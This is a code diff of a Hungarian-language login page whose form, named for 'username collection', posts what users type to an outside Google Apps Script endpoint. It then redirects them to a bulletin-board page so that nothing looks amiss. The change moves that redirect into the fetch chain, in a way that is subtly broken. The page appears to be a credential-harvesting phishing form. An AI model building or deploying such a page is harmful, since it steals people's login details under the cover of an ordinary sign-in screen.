@@ -237,7 +237,7 @@
             </div>
 
             <div class="btn-outer">
-              <button type="submit" class="btn" onclick="buttonClick()">BEJELENTKEZÉS</button>
+              <button type="submit" class="btn">BEJELENTKEZÉS</button>
             </div>
           </form>
           </div>
@@ -292,10 +292,6 @@
     });
   })();
 
-  function buttonClick() {
-    window.location.href = "./faliujsag.html";
-  }
-
   const scriptURL = 'https://script.google.com/macros/s/AKfycbzlZqcPg0w66xCpCqJ7xQ70X19u3TfmgDuTwJyGc9O7j9FK6Id9T-PhzXQX6K-INC8zDA/exec'
   const form = document.forms['felhasznalonev-gyujtese']
 
@@ -304,6 +300,7 @@
     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
       .then(response => console.log('Success!', response))
       .catch(error => console.error('Error!', error.message))
+      .then(window.location.href = "./faliujsag.html")
   })
 </script>
 </body>
